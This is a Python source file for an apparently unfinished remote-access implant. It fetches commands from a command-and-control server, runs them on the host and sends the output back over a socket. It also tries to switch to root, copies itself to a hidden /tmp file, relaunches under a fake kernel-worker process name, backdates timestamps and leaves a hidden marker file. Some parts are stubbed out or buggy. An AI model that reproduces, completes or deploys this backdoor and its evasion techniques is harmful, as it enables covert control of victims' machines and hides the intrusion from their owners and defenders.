#!/usr/bin/env python3

import subprocess
import hashlib
import os
import requests
import socket
import pwd
import psutil
import shutil
import shlex
import time
import random
import pathlib


password = "password"
HOST, PORT = "0.0.0.0", 9998


def handle(data):
    """Handle incoming commands from C2

    Args:
        data (array of 4 strings): {key}:{command}:{parameters}:{hash}
    """
    key = data[0]
    command = data[1]
    parameters = data[2]
    hash = data[3]

    if verify(key, command, parameters, hash):
        if command == "BUILTIN":
            stdout = run_builtin(parameters)
        else:
            stdout = run_command(command, parameters)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connect to server and send data
        sock.connect((HOST, PORT))
        output = f"Command: {command} {parameters}\n{stdout}"
        sock.sendall(bytes(output + "\n", "utf-8"))

def request_commands():
    """Make HTTP request 

    Returns:
        array: list of commands
    """
    r = requests.get(f"http://0.0.0.0:{PORT + 1}/commands.txt")
    return r.text.split()

def run_builtin(command):
    """Run builtin command, not local terminal 

    Args:
        command (string): familiar name of local command

    Returns:
        string: text result of running the command in question
    """
    if command == "name":
        return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
    elif command == "cwd":
        return os.getcwd()
    elif command == "env":
        return os.getenv()
    elif command == "pid":
        return str(os.getpid())


def run_command(command, parameters):
    """Execute command on local terminal

    Args:
        command (string): name of nix command
        parameters (array of strings): list of command args

    Returns:
        string: output of command or error message
    """
    try:
        #TODO add shelex processing
        cmd = subprocess.run([command, parameters], capture_output=True, check=True, encoding='utf-8')
    except subprocess.CalledProcessError:
        return "Error on Command"
    
    return cmd.stdout

def verify(key, command, parameters, hash):
    """Check hash of command, verifying that no data transmission errors have occured, then check against password

    Args:
        key (string): first value in command
        command (string): second value in command
        parameters (string): third value in command
        hash (string): included hash, to be comapred to by calculating locally

    Returns:
        bool: True if valid command
    """
    #TODO use salt and hash
    if key != password:
        return False
    
    data = f"{key}:{command}:{parameters}"
    if hashlib.sha256(data.encode("utf-8")).hexdigest() != hash:
        print("Data error detected!")
        return False
    return True

def get_pname(id):
    """get name of function from pid

    Args:
        id (int): pid of process

    Returns:
        string: name of process
    """
    return os.system(f"ps -o cmd= {id}")


def upgrade_shell():
    """ try to upgrade to root shell
    """
    try:
        uid = pwd.getpwnam('root')[2]
        os.setuid(uid)
    except PermissionError:
        pass

def become_silent():
    """Go stealth, move to secret location, set presence IOC
    """
    p = psutil.Process(os.getpid())
    cmdline = p.cmdline()[1]

    if check_mark(cmdline):
        print("No presence detected, going in...")
        #TODO randomize names
        hidden, bandit = "/tmp/.mem_buffer", "[kworker/2:0-events]"
        shutil.copyfile(cmdline, hidden)
        cmd = subprocess.run(["/bin/chmod", "+x",  f"{hidden}"])
        cmd = subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {p.exe()} {hidden} &\""))
        cmd = subprocess.run(["/bin/chmod", "-x",  f"{hidden}"])
        randomize_timestamp(hidden)
    else:
        #leave_mark()
        print("Hidden")
        print(os.getpid())
        while 1:
            continue

def randomize_timestamp(file):
    set_stamp = time.time() - random.randrange(15778463 ,31556926)
    os.utime(file, (set_stamp, set_stamp))

def leave_mark():
    #TODO add more names, randomize
    f = open(f"{str(pathlib.Path.home())}/.zshconf", "w")
    f.close()
    randomize_timestamp(f"{str(pathlib.Path.home())}/.zshconf")
    os.environ["BASH"] = "1"

def check_mark(cmdline):
    if "tmp" not in cmdline:
        return True
    # if os.path.isfile("~/.zshconfig"):
    #     return True
    # if os.environ.get("BASH") == "1":
    #     return True
    return False

if __name__ == "__main__":
    upgrade_shell()
    become_silent()
     #TODO Polling
    cmds = request_commands()

    # for cmd in cmds:
        # handle(cmd.split(":"))
